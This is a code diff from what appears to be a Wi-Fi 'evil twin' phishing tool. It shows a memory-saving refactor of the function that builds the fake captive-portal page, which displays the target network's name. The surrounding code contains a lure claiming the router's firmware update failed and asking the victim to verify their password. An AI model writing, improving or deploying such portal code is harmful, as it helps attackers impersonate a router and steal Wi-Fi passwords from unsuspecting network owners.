@@ -241,8 +241,8 @@ void handleClear() {
 #define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."
 
 String header(String t) {
-  String a = htmlEscape(String(_selectedNetwork.ssid));
-  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
+  String a = htmlEscape(_selectedNetwork.ssid);
+  const char* CSS = "article { background: #f2f2f2; padding: 1.3em; }"
                "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
                "div { padding: 0.5em; }"
                "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
@@ -251,12 +251,26 @@ String header(String t) {
                "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
                "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
                "textarea { width: 100%; }";
-  String h = "<!DOCTYPE html><html>"
-             "<head><title>" + a + " :: " + plainText(t) + "</title>"
-             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
-             "<style>" + CSS + "</style>"
-             "<meta charset=\"UTF-8\"></head>"
-             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
+  String h;
+  h.reserve(a.length() * 2 + t.length() * 2 + 1050); // ~1050 B for HTML tags, CSS & SUBTITLE + 2x SSID & title
+  h += "<!DOCTYPE html><html>"
+       "<head><title>";
+  h += a;
+  h += " :: ";
+  h += plainText(t);
+  h += "</title>"
+       "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
+       "<style>";
+  h += CSS;
+  h += "</style>"
+       "<meta charset=\"UTF-8\"></head>"
+       "<body><nav><b>";
+  h += a;
+  h += "</b> ";
+  h += SUBTITLE;
+  h += "</nav><div><h1>";
+  h += t;
+  h += "</h1></div><div>";
   return h;
 }
 
